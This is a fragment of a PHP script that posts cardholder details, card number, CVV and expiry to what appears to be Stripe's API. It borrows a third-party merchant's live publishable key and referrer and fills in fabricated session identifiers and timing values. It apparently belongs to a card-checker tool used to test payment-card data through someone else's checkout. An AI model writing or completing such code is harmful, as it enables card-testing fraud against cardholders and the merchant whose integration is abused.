...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[address][line1]='.$street.'&owner[address][line2]=g&owner[address][state]='.$state.'&owner[address][city]='.$city.'&owner[address][postal_code]='.$zip.'&owner[address][country]=US&owner[email]='.$email.'&owner[phone]='.$phone.'
&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=79cf8b01-0ba3-4daa-a99e-e9b3229fd8cb593542&muid=dbd08490-b222-447e-92bd-9e58bf61e3a69a7b04&sid=927c7208-1fbf-462b-841c-68f17fb32e532ce4e6&pasted_fields=number&payment_user_agent=stripe.js%2Ffd40a50eb%3B+stripe-js-v3%2Ffd40a50eb&time_on_page=50462&referrer=https%3A%2F%2Fcertified.rapsodo.com%2F&key=pk_live_D0MGNifpjJmwTs4l9rFM3yI400jlNtyVJJ');
